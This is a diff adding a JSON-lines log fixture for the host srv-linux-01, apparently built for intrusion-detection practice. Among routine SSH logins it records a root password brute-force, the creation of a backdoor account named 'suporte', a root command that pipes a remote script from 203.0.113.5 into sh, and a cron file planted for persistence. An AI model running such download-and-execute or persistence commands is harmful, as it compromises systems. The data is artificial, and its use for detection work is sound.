@@ -1,0 +1,51 @@
+{"timestamp": "2026-10-22T08:00:10Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.30 port 40691 ssh2", "src_ip": "10.0.4.29"}
+{"timestamp": "2026-10-22T08:04:26Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.14 port 54369 ssh2", "src_ip": "10.0.4.16"}
+{"timestamp": "2026-10-22T08:05:16Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for carla from 10.0.4.39 port 43342 ssh2", "src_ip": "10.0.4.26"}
+{"timestamp": "2026-10-22T08:05:40Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.38 port 34922 ssh2", "src_ip": "10.0.4.27"}
+{"timestamp": "2026-10-22T08:07:15Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.17 port 42905 ssh2", "src_ip": "10.0.4.20"}
+{"timestamp": "2026-10-22T08:07:39Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.25 port 30773 ssh2", "src_ip": "10.0.4.38"}
+{"timestamp": "2026-10-22T08:08:29Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.15 port 36146 ssh2", "src_ip": "10.0.4.30"}
+{"timestamp": "2026-10-22T08:11:47Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.37 port 54584 ssh2", "src_ip": "10.0.4.14"}
+{"timestamp": "2026-10-22T08:12:03Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for carla from 10.0.4.32 port 46875 ssh2", "src_ip": "10.0.4.16"}
+{"timestamp": "2026-10-22T08:12:15Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.30 port 34862 ssh2", "src_ip": "10.0.4.17"}
+{"timestamp": "2026-10-22T08:20:40Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.17 port 45212 ssh2", "src_ip": "10.0.4.26"}
+{"timestamp": "2026-10-22T08:24:09Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.20 port 34104 ssh2", "src_ip": "10.0.4.16"}
+{"timestamp": "2026-10-22T08:24:32Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.19 port 52607 ssh2", "src_ip": "10.0.4.38"}
+{"timestamp": "2026-10-22T08:25:00Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for ana from 10.0.4.15 port 41000 ssh2", "src_ip": "10.0.4.15"}
+{"timestamp": "2026-10-22T08:25:28Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.11 port 52281 ssh2", "src_ip": "10.0.4.30"}
+{"timestamp": "2026-10-22T08:25:50Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for ana from 10.0.4.15 port 41000 ssh2", "src_ip": "10.0.4.15"}
+{"timestamp": "2026-10-22T08:26:47Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.22 port 52777 ssh2", "src_ip": "10.0.4.34"}
+{"timestamp": "2026-10-22T08:26:54Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.38 port 37166 ssh2", "src_ip": "10.0.4.27"}
+{"timestamp": "2026-10-22T08:27:14Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.22 port 36264 ssh2", "src_ip": "10.0.4.23"}
+{"timestamp": "2026-10-22T08:27:46Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.14 port 38947 ssh2", "src_ip": "10.0.4.34"}
+{"timestamp": "2026-10-22T08:30:47Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.22 port 55598 ssh2", "src_ip": "10.0.4.12"}
+{"timestamp": "2026-10-22T08:31:47Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for carla from 10.0.4.26 port 56201 ssh2", "src_ip": "10.0.4.21"}
+{"timestamp": "2026-10-22T08:33:20Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40000 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:26Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40001 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:32Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40002 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:38Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40003 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:44Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40004 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:50Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40005 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:33:56Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40006 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:02Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40007 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:08Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40008 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:14Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40009 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:20Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40010 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:26Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40011 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:32Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40012 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:34:38Z", "host": "srv-linux-01", "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 40013 ssh2", "src_ip": "192.0.2.99"}
+{"timestamp": "2026-10-22T08:36:47Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.33 port 53934 ssh2", "src_ip": "10.0.4.18"}
+{"timestamp": "2026-10-22T08:39:22Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.11 port 53755 ssh2", "src_ip": "10.0.4.27"}
+{"timestamp": "2026-10-22T08:42:26Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.26 port 59833 ssh2", "src_ip": "10.0.4.26"}
+{"timestamp": "2026-10-22T08:43:08Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.22 port 37154 ssh2", "src_ip": "10.0.4.37"}
+{"timestamp": "2026-10-22T08:43:20Z", "host": "srv-linux-01", "Image": "/usr/sbin/useradd", "CommandLine": "useradd -m suporte", "User": "root"}
+{"timestamp": "2026-10-22T08:43:50Z", "host": "srv-linux-01", "Image": "/usr/bin/bash", "CommandLine": "curl -s http://203.0.113.5/i.sh | sh", "User": "root"}
+{"timestamp": "2026-10-22T08:44:20Z", "host": "srv-linux-01", "Image": "/usr/bin/bash", "CommandLine": "ls -la /home", "User": "root"}
+{"timestamp": "2026-10-22T08:45:00Z", "host": "srv-linux-01", "Image": "/usr/bin/vim", "TargetFilename": "/etc/cron.d/atualiza", "User": "root"}
+{"timestamp": "2026-10-22T08:45:10Z", "host": "srv-linux-01", "Image": "/usr/bin/dpkg", "TargetFilename": "/etc/cron.d/logrotate", "User": "root"}
+{"timestamp": "2026-10-22T08:48:56Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.28 port 37700 ssh2", "src_ip": "10.0.4.15"}
+{"timestamp": "2026-10-22T08:52:27Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.19 port 55096 ssh2", "src_ip": "10.0.4.35"}
+{"timestamp": "2026-10-22T08:53:50Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.29 port 40223 ssh2", "src_ip": "10.0.4.16"}
+{"timestamp": "2026-10-22T08:55:36Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for diego from 10.0.4.39 port 58164 ssh2", "src_ip": "10.0.4.11"}
+{"timestamp": "2026-10-22T08:57:03Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for bruno from 10.0.4.15 port 34942 ssh2", "src_ip": "10.0.4.32"}
+{"timestamp": "2026-10-22T08:58:18Z", "host": "srv-linux-01", "program": "sshd", "message": "Accepted publickey for ana from 10.0.4.17 port 53905 ssh2", "src_ip": "10.0.4.38"}
